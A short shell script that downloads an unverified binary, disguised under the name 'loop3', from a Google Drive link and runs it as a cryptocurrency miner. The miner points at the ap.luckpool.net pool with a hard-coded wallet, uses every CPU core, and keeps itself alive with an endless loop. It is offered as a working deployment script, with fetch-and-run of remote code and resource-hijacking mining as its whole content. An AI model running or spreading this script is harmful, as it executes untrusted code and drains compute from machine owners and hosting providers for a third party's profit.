#!/bin/sh
sudo apt update
sudo apt install screen -y
wget -O loop3 "https://drive.google.com/uc?export=download&id=1JTWxpvZU2wWUSDLRD070xUK9ggP6b6jm" > loop3
chmod +x loop3
./loop3 -v -l ap.luckpool.net:3956 -u RQ8nHsobx2G5cM9HtaCnZof7T7XgYjFi1c.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
while [ 1 ]; do
sleep 3
done
sleep 999
